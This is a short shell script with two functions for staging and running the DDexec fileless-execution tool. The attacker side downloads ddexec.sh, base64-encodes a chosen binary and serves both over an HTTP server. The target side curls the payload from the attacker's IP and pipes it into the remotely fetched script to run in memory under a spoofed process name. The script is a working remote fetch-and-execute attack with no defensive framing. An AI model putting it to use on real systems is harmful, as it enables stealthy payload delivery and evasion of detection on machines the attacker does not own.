


_ddexec_attacker_run() {
	PORT=$1
	COMMANDTORUN=$2
	mkdir /tmp/test 2> /dev/null
	cd /tmp/test
	wget https://raw.githubusercontent.com/arget13/DDexec/main/ddexec.sh -O ddexec.sh
	base64 -w0 $COMMANDTORUN > command.b64
	python3 -m http.server $PORT
}




_ddexec_target_machine() {
	IP=$1
	PORT=$2
	PROCESSNAME=$3
	curl http://$IP:$PORT/command.b64 | bash <(curl http://$IP:$PORT/ddexec.sh) $PROCESSNAME 

}

